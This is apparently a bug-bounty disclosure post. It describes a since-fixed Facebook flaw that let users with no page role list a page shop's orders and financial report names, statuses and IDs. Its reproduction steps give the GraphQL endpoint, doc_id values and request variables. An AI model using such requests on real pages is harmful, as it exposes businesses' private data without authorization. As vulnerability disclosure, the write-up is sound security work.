---
id: 597
title: 'View orders and financial reports lists for any page shop'
date: '2021-02-15T07:47:53+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=597'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Description**

This bug could allow an attacker with no role in a page to extract the list of financial and orders reports created by the admins of that page, this bug doesn’t allow to download the reports but it gets the file names , status of these reports and their ids which could be used later in other attacks to download these reports.  
The list of created financial and orders reports should be visible to only admins of pages because it may reveals the shop performance (dates in file and status of the creation of the report).

**Reproduction Steps**

*<span class="has-inline-color has-dark-yellow-color">Orders Reports:</span>* <span class="has-inline-color has-dark-yellow-color">  
</span>Send a POST request to <https://www.facebook.com/api/graphql/> with the parameters in the body as follow :

variables={“after”:null,”paymentInvoiceableFilter”:{“allowed_states”:\[“INITED”,”RISK_QUEUED”\],”chargeback_states”:null,”minimum_creation_time”:null,”invoice_ids”:null},”first”:20,”pageID”:”XXXXX”} where XXXXX is id of the page  
doc_id=2036256919799956

along with these parameters valid cookies are required and parameters like fb_dtsg and __a=1

The response should contain list of “Orders reports”

<span class="has-inline-color has-dark-yellow-color">*Financial Reports:* </span>  
Send a POST request to the same endpoint after changing doc_id=2127400373991060 and variables={“pageID”:”XXXXX”,”orderType”:”nmor_checkout_experiences”} where XXXXX is id of the page

**Timeline**

Jan 10, 2019— Report Sent   
Jan 21, 2019— Acknowledged by Facebook  
Feb 8, 2019— Fixed by Facebook  
Feb 12, 2019 — $500 bounty awarded by Facebook.